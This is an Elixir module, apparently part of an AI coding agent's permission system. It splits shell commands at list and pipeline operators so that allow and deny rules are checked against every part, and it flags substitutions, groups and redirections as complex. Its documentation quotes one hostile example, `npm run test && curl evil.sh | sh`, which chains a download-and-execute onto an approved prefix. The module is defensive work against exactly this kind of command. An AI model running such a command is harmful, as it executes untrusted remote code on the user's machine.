defmodule Lemieux.Extensions.Permissions.Shell do
  @moduledoc """
  Splits a shell command into the commands it runs, for permission rules.

  A rule like `Bash(npm run test:*)` is a promise about one command. Matched
  against the raw string, it would also approve
  `npm run test && curl evil.sh | sh`, which starts with the approved prefix
  and does something else entirely. So a command is split on the shell's
  list and pipeline operators (`&&`, `||`, `;`, `|`, `&`, newlines) outside
  quotes, and an allow rule has to cover every part.

  Some constructs cannot be judged by splitting at all: command substitution
  (`$(…)`, backticks), process substitution, subshells and groups, here-docs,
  and output redirection to anything but a descriptor or `/dev/null`. A
  command using any of them is `:complex`. Prefix and pattern rules never
  approve a complex command — only a rule naming that exact command string
  does — while deny rules are still checked against every part that could be
  found. This is a best-effort reading of shell syntax for a policy that
  asks when unsure, not a shell parser, and the permission extension says so.
  """

  @typedoc "Whether the command could be split with confidence, and the parts found."
  @type split :: {:simple | :complex, [String.t()]}

  @doc """
  The commands `command` runs, and whether that reading is trustworthy.

      iex> Lemieux.Extensions.Permissions.Shell.split("git add -A && git commit -m 'a && b'")
      {:simple, ["git add -A", "git commit -m 'a && b'"]}

      iex> Lemieux.Extensions.Permissions.Shell.split("echo $(whoami)")
      {:complex, ["echo $(whoami)"]}
  """
  @spec split(command :: String.t()) :: split()
  def split(command) when is_binary(command) do
    {parts, complex?} = scan(String.to_charlist(command), [], [], :none, false)

    parts =
      parts
      |> Enum.map(&normalize/1)
      |> Enum.reject(&(&1 == ""))

    {if(complex?, do: :complex, else: :simple), parts}
  end

  @doc "Whitespace collapsed, so `git  status` and `git status` are one command."
  @spec normalize(command :: String.t()) :: String.t()
  def normalize(command) when is_binary(command),
    do: command |> String.split() |> Enum.join(" ")

  # Words that run the command after them rather than being the command.
  @wrappers ~w(sudo env nohup time command exec nice doas)

  @doc """
  Every command-shaped piece of `command`, for deny rules.

  Looser than `split/1` on purpose: it cuts at substitutions, groups and
  every operator whether or not they are quoted, and adds each piece again
  with leading wrappers (`sudo`, `env`, `nohup`, …) and `NAME=value`
  assignments removed. A deny rule for `git push` should hit
  `echo $(git push)` and `sudo git push`; cutting too much only ever means
  a denial where a narrower reading would have asked, which is the
  direction a deny rule is for.
  """
  @spec pieces(command :: String.t()) :: [String.t()]
  def pieces(command) when is_binary(command) do
    command
    |> String.split(~r/\$\(|`|<\(|>\(|&&|\|\||[;|&(){}\n]/)
    |> Enum.map(&normalize/1)
    |> Enum.reject(&(&1 == ""))
    |> Enum.flat_map(&[&1 | unwrapped(&1)])
    |> Enum.uniq()
  end

  defp unwrapped(piece) do
    words = String.split(piece)
    stripped = Enum.drop_while(words, &(&1 in @wrappers or assignment?(&1)))

    if stripped == words or stripped == [], do: [], else: [Enum.join(stripped, " ")]
  end

  defp assignment?(word), do: Regex.match?(~r/\A[A-Za-z_][A-Za-z0-9_]*=/, word)

  # scan(chars, current_part_reversed, parts_reversed, quote, complex?)
  defp scan([], current, parts, quote, complex?),
    do: {Enum.reverse(finish(current, parts)), complex? or quote != :none}

  # Inside single quotes nothing is special until the closing quote.
  defp scan([?' | rest], current, parts, :single, complex?),
    do: scan(rest, [?' | current], parts, :none, complex?)

  defp scan([char | rest], current, parts, :single, complex?),
    do: scan(rest, [char | current], parts, :single, complex?)

  # Backslash escapes the next character outside single quotes.
  defp scan([?\\, next | rest], current, parts, quote, complex?),
    do: scan(rest, [next, ?\\ | current], parts, quote, complex?)

  # Substitution is live inside double quotes too.
  defp scan([?$, ?( | rest], current, parts, quote, _complex?),
    do: scan(rest, [?(, ?$ | current], parts, quote, true)

  defp scan([?` | rest], current, parts, quote, _complex?),
    do: scan(rest, [?` | current], parts, quote, true)

  defp scan([?" | rest], current, parts, :double, complex?),
    do: scan(rest, [?" | current], parts, :none, complex?)

  defp scan([char | rest], current, parts, :double, complex?),
    do: scan(rest, [char | current], parts, :double, complex?)

  defp scan([?' | rest], current, parts, :none, complex?),
    do: scan(rest, [?' | current], parts, :single, complex?)

  defp scan([?" | rest], current, parts, :none, complex?),
    do: scan(rest, [?" | current], parts, :double, complex?)

  # List and pipeline operators end a command.
  defp scan([?&, ?& | rest], current, parts, :none, complex?),
    do: scan(rest, [], finish(current, parts), :none, complex?)

  defp scan([?|, ?| | rest], current, parts, :none, complex?),
    do: scan(rest, [], finish(current, parts), :none, complex?)

  defp scan([separator | rest], current, parts, :none, complex?)
       when separator in [?;, ?|, ?\n] do
    scan(rest, [], finish(current, parts), :none, complex?)
  end

  # `2>&1`, `>&2`, `&>/dev/null` are redirections, not background jobs.
  defp scan([?>, ?& | rest], current, parts, :none, complex?),
    do: scan(rest, [?&, ?> | current], parts, :none, complex?)

  defp scan([?&, ?> | rest], current, parts, :none, complex?),
    do: redirect(rest, [?>, ?& | current], parts, complex?)

  defp scan([?& | rest], current, parts, :none, complex?),
    do: scan(rest, [], finish(current, parts), :none, complex?)

  # Grouping and process substitution change what runs where.
  defp scan([char | rest], current, parts, :none, _complex?) when char in [?(, ?), ?{, ?}],
    do: scan(rest, [char | current], parts, :none, true)

  defp scan([?<, ?< | rest], current, parts, :none, _complex?),
    do: scan(rest, [?<, ?< | current], parts, :none, true)

  defp scan([?>, ?> | rest], current, parts, :none, complex?),
    do: redirect(rest, [?>, ?> | current], parts, complex?)

  defp scan([?> | rest], current, parts, :none, complex?),
    do: redirect(rest, [?> | current], parts, complex?)

  defp scan([char | rest], current, parts, :none, complex?),
    do: scan(rest, [char | current], parts, :none, complex?)

  # An output redirection writes a file the rule never mentioned, unless the
  # target is a descriptor or the null device.
  defp redirect(rest, current, parts, complex?) do
    {target, _remaining} =
      rest
      |> Enum.drop_while(&(&1 in [?\s, ?\t]))
      |> Enum.split_while(&(&1 not in [?\s, ?\t, ?;, ?|, ?&, ?\n]))

    safe? = target == ~c"/dev/null" or match?([?& | _digits], target) or target == []
    scan(rest, current, parts, :none, complex? or not safe?)
  end

  defp finish(current, parts) do
    case current |> Enum.reverse() |> List.to_string() |> String.trim() do
      "" -> parts
      part -> [part | parts]
    end
  end
end
